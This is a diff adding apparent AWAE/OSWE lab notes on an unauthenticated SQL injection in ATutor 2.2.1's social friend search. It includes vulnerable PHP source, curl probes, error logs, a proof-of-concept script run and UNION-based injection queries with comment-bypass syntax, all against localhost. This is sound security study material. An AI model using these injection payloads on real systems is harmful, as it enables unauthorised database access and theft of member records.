@@ -1,0 +1,385 @@
+$ grep -Einr "$_user_location[[:space:]]+=[[:space:]]+'public';" /opt/lampp/htdocs/ATutor/
+/opt/lampp/htdocs/ATutor/login.php:15:$_user_location    = 'public';
+/opt/lampp/htdocs/ATutor/include/securimage/securimage_play.php:2:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/include/securimage/securimage_show.php:2:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/contact_instructor.php:15:$_user_location = 'public';
+/opt/lampp/htdocs/ATutor/inbox/sent_messages.php:14:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/inbox/index.php:14:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/inbox/export.php:14:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/inbox/send_message.php:14:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/get_custom_logo.php:18:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/social/activities.php:14:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/social/basic_profile.php:14:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/social/index.php:14:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/social/connections.php:14:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/social/privacy_settings.php:14:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/social/index_mystart.php:16:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/social/edit_profile.php:14:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/social/settings.php:14:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/social/set_prefs.php:16:$_user_location = 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/social/index_public.php:14:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/social/sprofile.php:14:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/social/profile_picture.php:14:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/social/groups/view.php:14:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/social/groups/invitation_handler.php:14:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/social/groups/create.php:14:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/social/groups/delete.php:14:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/social/groups/index.php:14:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/social/groups/list.php:14:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/social/groups/edit.php:14:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/social/groups/search.php:14:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/social/groups/get_sgroup_logo.php:19:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/social/groups/invite.php:14:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/social/groups/join.php:14:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/social/lib/OAuth/authorize.php:14:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/social/applications.php:14:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/photos/get_photo.php:18:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/photos/photo.php:14:$_user_location = 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/photos/delete_photo.php:14:$_user_location = 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/photos/edit_album.php:14:$_user_location = 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/photos/albums.php:14:$_user_location = 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/photos/create_album.php:14:$_user_location = 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/photos/profile_album.php:14:$_user_location = 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/photos/index.php:14:$_user_location = 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/photos/edit_photos.php:14:$_user_location = 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/photos/set_profile_picture.php:16:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/photos/search.php:14:$_user_location = 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/photos/addComment.php:14:$_user_location = 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/photos/delete_comment.php:14:$_user_location = 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/photos/edit_comment.php:14:$_user_location = 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/photos/delete_album.php:14:$_user_location = 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/calendar/change_view.php:20:    $_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/calendar/file_import.php:17:    $_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/calendar/index.php:17:    $_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/calendar/getlanguage.php:19:        $_user_location = 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/calendar/update_personal_event.php:20:    $_user_location = 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/calendar/json-events-gcal.php:17:         $_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/calendar/google_calendarlist.php:19:      $_user_location = 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/calendar/google_connect_disconnect.php:24:    $_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/calendar/index_mystart.php:17:    $_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/calendar/export.php:17:    $_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/calendar/google_calendar_db_sync.php:20:         $_user_location = 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/calendar/json-events.php:20:         $_user_location = 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/calendar/google_calendar_update.php:17:          $_user_location = 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/calendar/send_mail.php:17:        $_user_location = 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/calendar/index_public.php:19:    $_user_location = 'public';
+/opt/lampp/htdocs/ATutor/mods/_standard/calendar/lib/Zend/Gdata/Calendar/EventQuery.php:76:    protected $_visibility = 'public';
+/opt/lampp/htdocs/ATutor/mods/_core/imscp/ims_export.php:81:	$_user_location = 'public';
+/opt/lampp/htdocs/ATutor/mods/_core/languages/translate_atutor.php:15:$_user_location = 'public';
+/opt/lampp/htdocs/ATutor/mods/_core/imscc/ims_export.php:79:	$_user_location = 'public';
+/opt/lampp/htdocs/ATutor/password_reminder.php:15:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/browse.php:15:$_user_location = 'public';
+/opt/lampp/htdocs/ATutor/help/index.php:14:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/help/contact_support.php:15:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/help/accessibility.php:15:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/registration.php:14:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/search.php:15:$_user_location = 'public';
+/opt/lampp/htdocs/ATutor/get_profile_img.php:18:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/get_course_icon.php:18:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/admin/cron.php:2:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/bounce.php:85:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/get_acheck.php:20:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/get_rss.php:27:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/confirm.php:14:$_user_location = 'public';
+/opt/lampp/htdocs/ATutor/about.php:14:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/logout.php:15:$_user_location	= 'public';
+/opt/lampp/htdocs/ATutor/go.php:18:$_user_location	= 'public';  //like browse, and registration, doesn't need username/passwords to get into
+
+
+
+In /opt/lampp/htdocs/ATutor/mods/_standard/social/index_public.php:
+
+if (isset($_GET['q'])){
+        $query = $addslashes($_GET['q']);
+
+        //retrieve a list of friends by the search
+        $search_result = searchFriends($query);
+
+
+        if (!empty($search_result)){
+                echo '<div class="suggestions">'._AT('suggestions').':<br/>';
+                $counter = 0;
+                foreach($search_result as $member_id=>$member_array){
+                        //display 10 suggestions
+                        if ($counter > 10){
+                                break;
+                        }
+
+                        echo '<a href="javascript:void(0);" onclick="document.getElementById(\'search_friends\').value=\''.printSocialName($member_id, false).'\'; document.getElementById(\'search_friends_form\').submit();">'.printSocialName($member_id, false).'</a><br/>';
+                        $counter++;
+                }
+                echo '</div>';
+        }
+        exit;
+}
+
+
+
+$ curl 'http://localhost/ATutor/mods/_standard/social/index_public.php?q=AAAA'
+
+
+
+$ sudo tail -15 /opt/lampp/var/mysql/mysql.log
+220602 21:01:01	    4 Connect	root@localhost on atutor
+		    4 Query	SET NAMES utf8
+		    4 Query	SELECT * FROM AT_config
+		    4 Query	SELECT * FROM AT_languages ORDER BY native_name
+		    4 Query	SELECT dir_name FROM AT_themes WHERE status=2
+		    4 Query	SELECT customized FROM AT_themes WHERE dir_name = 'default'
+		    4 Query	SELECT customized FROM AT_themes WHERE dir_name = 'default'
+		    4 Query	SELECT * FROM AT_courses ORDER BY title
+		    4 Query	SELECT dir_name, privilege, admin_privilege, status, cron_interval, cron_last_run FROM AT_modules WHERE status=2
+		    4 Query	SELECT L.* FROM AT_language_text L, AT_language_pages P WHERE L.language_code="en" AND L.term=P.term AND P.page="/mods/_standard/social/index_public.php" ORDER BY L.variable ASC
+		    4 Query	SELECT L.* FROM AT_language_text L WHERE L.language_code="en" AND L.term="test" ORDER BY variable ASC LIMIT 1
+		    4 Query	INSERT IGNORE INTO AT_language_pages (`term`, `page`) VALUES ("test", "/mods/_standard/social/index_public.php")
+		    4 Query	SELECT * FROM AT_modules WHERE dir_name ='_core/services' && status ='2'
+		    4 Query	SELECT * FROM AT_members M WHERE (first_name LIKE '%AAAA%'  OR second_name LIKE '%AAAA%'  OR last_name LIKE '%AAAA%'  OR login LIKE '%AAAA%'  )
+		    4 Quit
+
+
+
+$ curl 'http://localhost/ATutor/mods/_standard/social/index_public.php?q=AAAA%27'
+<br />
+<b>Warning</b>:  Invalid argument supplied for foreach() in <b>/opt/lampp/htdocs/ATutor/mods/_standard/social/lib/friends.inc.php</b> on line <b>350</b><br />
+
+
+
+$ tail -5 /opt/lampp/logs/php_error_log
+SQL: SELECT * FROM AT_members M WHERE (first_name LIKE '%AAAA'%'  OR second_name LIKE '%AAAA'%'  OR last_name LIKE '%AAAA'%'  OR login LIKE '%AAAA'%'  ) 
+[02-Jun-2022 14:58:37 Europe/Berlin] PHP Warning:  Invalid argument supplied for foreach() in /opt/lampp/htdocs/ATutor/mods/_standard/social/lib/friends.inc.php on line 350
+[02-Jun-2022 15:01:57 Europe/Berlin] You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'  OR second_name LIKE '%AAAA'%'  OR last_name LIKE '%AAAA'%'  OR login LIKE '%' at line 1
+SQL: SELECT * FROM AT_members M WHERE (first_name LIKE '%AAAA'%'  OR second_name LIKE '%AAAA'%'  OR last_name LIKE '%AAAA'%'  OR login LIKE '%AAAA'%'  ) 
+[02-Jun-2022 15:01:57 Europe/Berlin] PHP Warning:  Invalid argument supplied for foreach() in /opt/lampp/htdocs/ATutor/mods/_standard/social/lib/friends.inc.php on line 350
+
+
+
+$ python3 /home/rockylinux/Documents/AWAE/3.3/poc1.py localhost "AAAA'"
+Response Headers:
+{'Date': 'Thu, 02 Jun 2022 13:10:47 GMT', 'Server': 'Apache/2.4.10 (Unix) OpenSSL/1.0.1i PHP/5.5.15 mod_perl/2.0.8-dev Perl/v5.16.3', 'X-Powered-By': 'PHP/5.5.15', 'Set-Cookie': 'ATutorID=euc4gks0s70vbi6opuuuru6lu1; path=/ATutor/, ATutorID=hrn4lk3p942h4obijehml5ipk1; path=/ATutor/, ATutorID=hrn4lk3p942h4obijehml5ipk1; path=/ATutor/', 'Content-Encoding': 'gzip', 'Vary': 'Accept-Encoding', 'Content-Length': '154', 'Keep-Alive': 'timeout=5, max=100', 'Connection': 'Keep-Alive', 'Content-Type': 'text/html; charset=utf-8'}
+
+Response Content:
+
+Warning:  Invalid argument supplied for foreach() in /opt/lampp/htdocs/ATutor/mods/_standard/social/lib/friends.inc.php on line 350
+
+
+Errors found in response. Possible SQL injection found
+
+
+
+$ tail -5 /opt/lampp/logs/php_error_log
+SQL: SELECT * FROM AT_members M WHERE (first_name LIKE '%AAAA'%'  OR second_name LIKE '%AAAA'%'  OR last_name LIKE '%AAAA'%'  OR login LIKE '%AAAA'%'  ) 
+[02-Jun-2022 15:12:43 Europe/Berlin] PHP Warning:  Invalid argument supplied for foreach() in /opt/lampp/htdocs/ATutor/mods/_standard/social/lib/friends.inc.php on line 350
+[02-Jun-2022 15:13:08 Europe/Berlin] You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%'  OR second_name LIKE '%AAAA'%'  OR last_name LIKE '%AAAA'%'  OR login LIKE '%' at line 1
+SQL: SELECT * FROM AT_members M WHERE (first_name LIKE '%AAAA'%'  OR second_name LIKE '%AAAA'%'  OR last_name LIKE '%AAAA'%'  OR login LIKE '%AAAA'%'  ) 
+[02-Jun-2022 15:13:08 Europe/Berlin] PHP Warning:  Invalid argument supplied for foreach() in /opt/lampp/htdocs/ATutor/mods/_standard/social/lib/friends.inc.php on line 350
+
+
+
+$ /opt/lampp/bin/mysql -u root
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 10
+Server version: 5.6.20-log Source distribution
+
+Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> USE atutor;
+Database changed
+mysql> SELECT COUNT(*) FROM information_schema.columns WHERE table_name = 'AT_members';                                                                                                                            
++----------+
+| COUNT(*) |
++----------+
+|       23 |
++----------+
+1 row in set (0.00 sec)
+
+mysql> SELECT * FROM AT_members M WHERE (first_name LIKE '%AAAAAAAAAAAAAAAAAAA')/**/UNION/**/SELECT/**/NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL;#
++-----------+-------+----------+-------+---------+------------+-------------+-----------+------+--------+---------+--------+------+----------+---------+-------+--------+-------------+---------------+----------+--------------+---------------+------------+
+| member_id | login | password | email | website | first_name | second_name | last_name | dob  | gender | address | postal | city | province | country | phone | status | preferences | creation_date | language | inbox_notify | private_email | last_login |
++-----------+-------+----------+-------+---------+------------+-------------+-----------+------+--------+---------+--------+------+----------+---------+-------+--------+-------------+---------------+----------+--------------+---------------+------------+
+|      NULL | NULL  | NULL     | NULL  | NULL    | NULL       | NULL        | NULL      | NULL | NULL   | NULL    | NULL   | NULL | NULL     | NULL    | NULL  |   NULL | NULL        | NULL          | NULL     |         NULL |          NULL | NULL       |
++-----------+-------+----------+-------+---------+------------+-------------+-----------+------+--------+---------+--------+------+----------+---------+-------+--------+-------------+---------------+----------+--------------+---------------+------------+
+1 row in set (0.00 sec)
+
+mysql> quit
+Bye
+
+
+
+$ grep -Einr 'function[[:space:]]+searchFriends\(' /opt/lampp/htdocs/ATutor/
+/opt/lampp/htdocs/ATutor/mods/_standard/social/lib/friends.inc.php:260:function searchFriends($name, $searchMyFriends = false, $offset=-1){
+
+
+
+In /opt/lampp/htdocs/ATutor/mods/_standard/social/lib/friends.inc.php:
+
+function searchFriends($name, $searchMyFriends = false, $offset=-1){
+        global $addslashes;
+        $result = array();
+        $my_friends = array();
+        $exact_match = false;
+
+        //break the names by space, then accumulate the query
+        if (preg_match("/^\\\\?\"(.*)\\\\?\"$/", $name, $matches)){
+                $exact_match = true;
+                $name = $matches[1];
+        }
+        $name = $addslashes($name);
+        $sub_names = explode(' ', $name);
+        foreach($sub_names as $piece){
+                if ($piece == ''){
+                        continue;
+                }
+
+                //if there are 2 double quotes around a search phrase, then search it as if it's "first_name last_name".
+                //else, match any contact in the search phrase.
+                if ($exact_match){
+                        $match_piece = "= '$piece' ";
+                } else {
+                        //$match_piece = "LIKE '%$piece%' ";
+                        $match_piece = "LIKE '%%$piece%%' ";
+                }
+                if(!isset($query )){
+                    $query = '';
+                }
+                $query .= "(first_name $match_piece OR second_name $match_piece OR last_name $match_piece OR login $match_piece ) AND ";
+        }
+        //trim back the extra "AND "
+        $query = substr($query, 0, -4);
+
+...
+
+        $sql = $sql . $query;
+        if ($offset >= 0){
+                $sql .= " LIMIT $offset, ". SOCIAL_FRIEND_SEARCH_MAX;
+        }
+
+        $rows_members = queryDB($sql, array());
+
+...
+
+}
+
+
+
+In /opt/lampp/htdocs/ATutor/mods/_standard/social/index_public.php:
+
+if (isset($_GET['q'])){
+        $query = $addslashes($_GET['q']);
+
+        //retrieve a list of friends by the search
+        $search_result = searchFriends($query);
+
+
+        if (!empty($search_result)){
+                echo '<div class="suggestions">'._AT('suggestions').':<br/>';
+                $counter = 0;
+                foreach($search_result as $member_id=>$member_array){
+                        //display 10 suggestions
+                        if ($counter > 10){
+                                break;
+                        }
+
+                        echo '<a href="javascript:void(0);" onclick="document.getElementById(\'search_friends\').value=\''.printSocialName($member_id, false).'\'; document.getElementById(\'search_friends_form\').submit();">'.printSocialName($member_id, false).'</a><br/>';
+                        $counter++;
+                }
+                echo '</div>';
+        }
+        exit;
+}
+
+
+
+$ grep -Einr 'function[[:space:]]+printSocialName\(' /opt/lampp/htdocs/ATutor/
+/opt/lampp/htdocs/ATutor/mods/_standard/social/lib/friends.inc.php:561:function printSocialName($id, $link=true){
+
+
+
+In /opt/lampp/htdocs/ATutor/mods/_standard/social/lib/friends.inc.php:
+
+function printSocialName($id, $link=true){
+    if(!isset($str)){
+        $str = '';
+    }
+        $str .= AT_print(get_display_name($id), 'members.full_name');
+        if ($link) {
+                return getProfileLink($id, $str);
+        }
+        return $str;
+}
+
+
+
+$ grep -Einr 'function[[:space:]]+get_display_name\(' /opt/lampp/htdocs/ATutor/
+/opt/lampp/htdocs/ATutor/include/lib/vital_funcs.inc.php:289:function get_display_name($id) {
+
+
+
+In /opt/lampp/htdocs/ATutor/include/lib/vital_funcs.inc.php:
+
+function get_display_name($id) {
+        static $_config, $display_name_formats;
+        if (!$id) {
+                return $_SESSION['login'];
+        }
+
+        if (!isset($db, $_config)) {
+                global $db, $_config, $display_name_formats;
+        }
+
+        if (substr($id, 0, 2) == 'g_' || substr($id, 0, 2) == 'G_'){
+                $sql = "SELECT name FROM %sguests WHERE guest_id='%d'";
+        $row = queryDB($sql, array(TABLE_PREFIX, $id), TRUE);
+                return _AT($display_name_formats[$_config['display_name_format']], '', $row['name'], '', '');
+        }else{
+                $sql    = "SELECT login, first_name, second_name, last_name FROM %smembers WHERE member_id='%d'";
+        $row    = queryDB($sql, array(TABLE_PREFIX, $id), TRUE);
+                return _AT($display_name_formats[$_config['display_name_format']], $row['login'], $row['first_name'], $row['second_name'], $row['last_name']);
+        }
+}
+
+
+
+$ /opt/lampp/bin/mysql -u root
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 16
+Server version: 5.6.20-log Source distribution
+
+Copyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> use atutor;                                                                                                                                                                                                 
+Database changed
+mysql> SELECT login,first_name,second_name,last_name FROM AT_members M WHERE (first_name LIKE '%atutor')/**/UNION/**/SELECT/**/title,version,dir_name,type/**/FROM/**/AT_themes;#
++----------------+------------+--------------------+-----------+
+| login          | first_name | second_name        | last_name |
++----------------+------------+--------------------+-----------+
+| atutor         | atutor     |                    | atutor    |
+| ATutor         | 2.2.1      | default            | Desktop   |
+| ATutor 2.1     | 2.2.1      | default21          | Desktop   |
+| Fluid          | 2.2.1      | fluid              | Desktop   |
+| ATutor Classic | 2.2.1      | default_classic    | Desktop   |
+| Blumin         | 2.2.1      | blumin             | Desktop   |
+| Greenmin       | 2.2.1      | greenmin           | Desktop   |
+| ATutor 2.0     | 2.2.1      | default20          | Desktop   |
+| ATutor 1.5     | 2.2.1      | default15          | Desktop   |
+| ATutor 1.6     | 2.2.1      | default16          | Desktop   |
+| IDI Theme      | 2.2.1      | idi                | Desktop   |
+| Mobile         | 2.2.1      | mobile             | Mobile    |
+| Simple         | 2.2.1      | simplified_desktop | Desktop   |
+| ATutorSpaces   | 2.2.1      | atspaces           | Desktop   |
++----------------+------------+--------------------+-----------+
+14 rows in set (0.00 sec)
+
+mysql> quit
+Bye
